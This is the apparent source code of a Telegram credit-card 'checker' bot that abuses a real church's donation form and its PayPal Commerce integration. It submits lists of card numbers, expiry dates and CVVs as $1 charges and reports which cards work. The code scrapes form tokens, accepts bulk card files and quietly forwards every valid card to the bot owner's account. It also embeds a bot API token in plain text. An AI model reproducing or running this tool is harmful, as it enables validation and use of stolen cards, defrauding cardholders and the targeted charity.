import requests
import base64
import re
import time
import threading
import telebot
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telebot import types
import traceback

# --- إعدادات البوت ---
API_TOKEN = '8502584740:AAEbJ7j3DD9dQ3ADwJsYLkqBItgTUGNA-MY'
DEV_USERNAME = "@DRGAM"
GATEWAY_NAME = "PayPal_CVV_Custom [$1]"
OWNER_ID = 1427023555

bot = telebot.TeleBot(API_TOKEN)
user_stats = {}


def drgam_check(ccx):
    """النسخة الحديثة من بوابة DrGaM"""
    r = None
    try:
        r = requests.Session()
        user = generate_user_agent()
        ccx = ccx.strip()
        parts = ccx.split("|")
        
        if len(parts) < 4:
            return "Invalid Format"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        headers = {'user-agent': user}
        
        try:
            response = r.get('https://gracelandwest.org/membership/', headers=headers, timeout=30)
        except Exception as e:
            return f"Connection Error"
        
        match1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        match2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        match3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        match4 = re.search(r'"data-client-token":"(.*?)"', response.text)
        
        if not all([match1, match2, match3, match4]):
            return "Gateway Error - Retry"
        
        id_form1 = match1.group(1)
        id_form2 = match2.group(1)
        nonec = match3.group(1)
        enc = match4.group(1)
        
        try:
            dec = base64.b64decode(enc).decode('utf-8')
            match5 = re.search(r'"accessToken":"(.*?)"', dec)
            if not match5:
                return "Gateway Error - Token"
            au = match5.group(1)
        except:
            return "Gateway Error - Decode"
        
        headers2 = {
            'origin': 'https://gracelandwest.org',
            'referer': 'https://gracelandwest.org/membership/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://gracelandwest.org/membership/',
            'give-form-url': 'https://gracelandwest.org/membership/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'card_name': 'drgam ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        try:
            r.post('https://gracelandwest.org/wp-admin/admin-ajax.php', headers=headers2, data=data, timeout=30)
        except:
            pass
        
        mp_data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://gracelandwest.org/membership/'),
            'give-form-url': (None, 'https://gracelandwest.org/membership/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'DRGAM'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'drgam22@gmail.com'),
            'card_name': (None, 'drgam '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers3 = {
            'content-type': mp_data.content_type,
            'origin': 'https://gracelandwest.org',
            'referer': 'https://gracelandwest.org/membership/',
            'user-agent': user,
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        
        try:
            response = r.post(
                'https://gracelandwest.org/wp-admin/admin-ajax.php',
                params=params,
                headers=headers3,
                data=mp_data,
                timeout=30
            )
            tok = response.json()['data']['id']
        except:
            return "Gateway Error - Order"
        
        headers4 = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        try:
            r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers4,
                json=json_data,
                timeout=30
            )
        except:
            pass
        
        mp_data2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://gracelandwest.org/membership/'),
            'give-form-url': (None, 'https://gracelandwest.org/membership/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'DRGAM'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'drgam22@gmail.com'),
            'card_name': (None, 'drgam '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers5 = {
            'content-type': mp_data2.content_type,
            'origin': 'https://gracelandwest.org',
            'referer': 'https://gracelandwest.org/membership/',
            'user-agent': user,
        }
        
        params2 = {
            'action': 'give_paypal_commerce_approve_order',
            'order': tok,
        }
        
        try:
            response = r.post(
                'https://gracelandwest.org/wp-admin/admin-ajax.php',
                params=params2,
                headers=headers5,
                data=mp_data2,
                timeout=30
            )
        except:
            return "Connection Error"
        
        text = response.text
        
        if 'ORDER_NOT_APPROVED' in text:
            return 'Order Not Approved'
        elif 'DO_NOT_HONOR' in text:
            return "Do Not Honor"
        elif 'ACCOUNT_CLOSED' in text:
            return "Account Closed"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "Account Closed"
        elif 'LOST_OR_STOLEN' in text:
            return "Lost Or Stolen"
        elif 'CVV2_FAILURE' in text:
            return "CVV Declined"
        elif 'SUSPECTED_FRAUD' in text:
            return "Suspected Fraud"
        elif 'INVALID_ACCOUNT' in text:
            return 'Invalid Account'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "Reattempt Not Permitted"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text or 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "Account Blocked"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'Pickup Card'
        elif 'PAYER_CANNOT_PAY' in text:
            return "Payer Cannot Pay"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'Insufficient Funds ✅'
        elif 'GENERIC_DECLINE' in text:
            return 'Generic Decline'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "Compliance Violation"
        elif 'TRANSACTION_NOT_PERMITTED' in text or 'TRANSACTION_NOT PERMITTED' in text:
            return "Transaction Not Permitted"
        elif 'PAYMENT_DENIED' in text:
            return 'Payment Denied'
        elif 'INVALID_TRANSACTION' in text:
            return "Invalid Transaction"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "Restricted Account"
        elif 'SECURITY_VIOLATION' in text:
            return 'Security Violation'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "Declined Updated Account"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "Invalid Card"
        elif 'EXPIRED_CARD' in text:
            return "Expired Card"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "Cryptographic Failure"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "Transaction Cannot Be Completed"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "Declined Please Retry"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "Exceed Limit"
        elif 'true' in text or 'sucsess' in text or 'success' in text:
            return "Charged $1 ✅"
        else:
            try:
                result = response.json()['data']['error']
                return result
            except:
                return "Unknown Error"
                
    except Exception as e:
        return f"Error"
    finally:
        if r:
            try:
                r.close()
            except:
                pass


def is_approved(result):
    if result == "Charged $1 ✅":
        return True
    if result == "Insufficient Funds ✅":
        return True
    return False


@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🔥 <b>PayPal CVV Checker Bot</b> 🔥\n\n"
        "<b>Commands:</b>\n"
        "<code>/pp</code> card - Check single card\n"
        "<b>Send file</b> - Check combo file\n\n"
        "<b>Example:</b>\n"
        "<code>/pp 4532123456789012|12|2025|123</code>\n\n"
        f"<b>Dev:</b> {DEV_USERNAME}"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode='HTML')


@bot.message_handler(commands=['pp'])
def check_single_card(message):
    try:
        card = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ <b>خطأ!</b>\n\nالاستخدام الصحيح:\n<code>/pp 4532123456789012|12|2025|123</code>", parse_mode='HTML')
        return
    
    wait_msg = bot.reply_to(message, "⏳ جاري الفحص...")
    
    result = drgam_check(card)
    
    if is_approved(result):
        response_text = (
            f"✅ <b>APPROVED!</b>\n\n"
            f"<b>Card:</b> <code>{card}</code>\n"
            f"<b>Status:</b> {result}\n"
            f"<b>Gateway:</b> {GATEWAY_NAME}\n"
            f"<b>By:</b> {DEV_USERNAME}"
        )
        if message.chat.id != OWNER_ID:
            try:
                bot.send_message(OWNER_ID, response_text, parse_mode='HTML')
            except:
                pass
    else:
        response_text = (
            f"❌ <b>DECLINED</b>\n\n"
            f"<b>Card:</b> <code>{card}</code>\n"
            f"<b>Status:</b> {result}\n"
            f"<b>Gateway:</b> {GATEWAY_NAME}"
        )
    
    bot.edit_message_text(response_text, message.chat.id, wait_msg.message_id, parse_mode='HTML')


@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ يرجى إرسال ملف نصي (.txt) فقط.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        cards = [c.strip() for c in downloaded_file.decode('utf-8').splitlines() if c.strip() and '|' in c]
        total = len(cards)
        filename = message.document.file_name
        chat_id = message.chat.id
        
        if total == 0:
            bot.reply_to(message, "❌ الملف فارغ أو لا يحتوي على بطاقات صالحة!")
            return

        user_stats[chat_id] = {
            'charged': 0,
            'approved': 0,
            'declined': 0,
            'total': total,
            'checked': 0,
            'running': True,
            'current_card': 'Starting...',
            'current_status': 'Initializing...'
        }

        initial_text = (
            f"<b>Gateway</b> {GATEWAY_NAME}\n"
            f"<b>By →</b> {DEV_USERNAME}\n\n"
            f"• <code>Starting...</code> •\n"
            f"• <b>STATUS</b> ➜ Initializing... •\n"
            f"• <b>CHARGED</b> 💰 ➜ [ 0 ] •\n"
            f"• <b>APPROVED</b> ✅ ➜ [ 0 ] •\n"
            f"• <b>DECLINED</b> ❌ ➜ [ 0 ] •\n"
            f"• <b>TOTAL</b> 💀 ➜ [ {total} ] •\n"
            f"• <b>CHECKED</b> ➜ [ 0/{total} ] •"
        )
        
        markup = types.InlineKeyboardMarkup()
        stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}")
        markup.add(stop_btn)
        
        msg = bot.reply_to(message, initial_text, parse_mode='HTML', reply_markup=markup)
        msg_id = msg.message_id

        # بدء الفحص مباشرة في Thread منفصل
        def run_checker():
            try:
                # بدء تحديث اللوحة
                def update_loop():
                    while chat_id in user_stats and user_stats[chat_id].get('running', False):
                        try:
                            stats = user_stats[chat_id]
                            text = (
                                f"<b>Gateway</b> {GATEWAY_NAME}\n"
                                f"<b>By →</b> {DEV_USERNAME}\n\n"
                                f"• <code>{stats.get('current_card', 'N/A')}</code> •\n"
                                f"• <b>STATUS</b> ➜ {stats.get('current_status', 'Checking...')} •\n"
                                f"• <b>CHARGED</b> 💰 ➜ [ {stats.get('charged', 0)} ] •\n"
                                f"• <b>APPROVED</b> ✅ ➜ [ {stats.get('approved', 0)} ] •\n"
                                f"• <b>DECLINED</b> ❌ ➜ [ {stats.get('declined', 0)} ] •\n"
                                f"• <b>TOTAL</b> 💀 ➜ [ {stats.get('total', 0)} ] •\n"
                                f"• <b>CHECKED</b> ➜ [ {stats.get('checked', 0)}/{stats.get('total', 0)} ] •"
                            )
                            
                            markup = types.InlineKeyboardMarkup()
                            stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}")
                            markup.add(stop_btn)
                            
                            bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML', reply_markup=markup)
                        except:
                            pass
                        time.sleep(2)
                
                update_thread = threading.Thread(target=update_loop, daemon=True)
                update_thread.start()
                
                # فحص البطاقات
                for i, card in enumerate(cards):
                    if not user_stats.get(chat_id, {}).get('running', False):
                        break
                    
                    user_stats[chat_id]['current_card'] = card
                    user_stats[chat_id]['current_status'] = "Checking..."
                    
                    result = drgam_check(card)
                    
                    # إعادة المحاولة إذا كان هناك خطأ
                    if "Error" in result or "Gateway Error" in result:
                        time.sleep(2)
                        result = drgam_check(card)
                    
                    user_stats[chat_id]['current_status'] = result
                    user_stats[chat_id]['checked'] = i + 1
                    
                    if is_approved(result):
                        if "Charged" in result:
                            user_stats[chat_id]['charged'] += 1
                        else:
                            user_stats[chat_id]['approved'] += 1
                        
                        hit_text = (
                            f"✅ <b>HIT FOUND!</b>\n\n"
                            f"<b>Card:</b> <code>{card}</code>\n"
                            f"<b>Status:</b> {result}\n"
                            f"<b>Gateway:</b> {GATEWAY_NAME}\n"
                            f"<b>By:</b> {DEV_USERNAME}"
                        )
                        try:
                            bot.send_message(chat_id, hit_text, parse_mode='HTML')
                        except:
                            pass
                        
                        if chat_id != OWNER_ID:
                            try:
                                bot.send_message(OWNER_ID, hit_text, parse_mode='HTML')
                            except:
                                pass
                    else:
                        user_stats[chat_id]['declined'] += 1
                    
                    time.sleep(5)
                
                # انتهاء الفحص
                if chat_id in user_stats:
                    user_stats[chat_id]['running'] = False
                
                stats = user_stats.get(chat_id, {})
                summary = (
                    f"✅ <b>Checking Complete!</b>\n\n"
                    f"<b>File:</b> {filename}\n"
                    f"<b>Gateway:</b> {GATEWAY_NAME}\n\n"
                    f"• <b>CHARGED</b> 💰 ➜ [ {stats.get('charged', 0)} ]\n"
                    f"• <b>APPROVED</b> ✅ ➜ [ {stats.get('approved', 0)} ]\n"
                    f"• <b>DECLINED</b> ❌ ➜ [ {stats.get('declined', 0)} ]\n"
                    f"• <b>TOTAL</b> ➜ [ {stats.get('total', 0)} ]\n\n"
                    f"<b>By:</b> {DEV_USERNAME}"
                )
                try:
                    bot.send_message(chat_id, summary, parse_mode='HTML')
                except:
                    pass
                    
            except Exception as e:
                print(f"Error in checker: {e}")
                traceback.print_exc()

        # بدء Thread الفحص
        checker_thread = threading.Thread(target=run_checker, daemon=True)
        checker_thread.start()
        
    except Exception as e:
        print(f"Error handling document: {e}")
        traceback.print_exc()
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")


@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop(call):
    try:
        chat_id = int(call.data.split('_')[1])
        if chat_id in user_stats:
            user_stats[chat_id]['running'] = False
            bot.answer_callback_query(call.id, "🛑 تم إيقاف الفحص!")
            try:
                bot.send_message(chat_id, "🛑 <b>تم إيقاف عملية الفحص.</b>", parse_mode='HTML')
            except:
                pass
    except:
        pass


@bot.message_handler(commands=['stop'])
def stop_checking(message):
    if message.chat.id in user_stats:
        user_stats[message.chat.id]['running'] = False
        bot.reply_to(message, "🛑 <b>تم إيقاف عملية الفحص.</b>", parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ لا توجد عملية فحص جارية.")


print("🔥 Bot is running...")
bot.infinity_polling(timeout=60, long_polling_timeout=60)
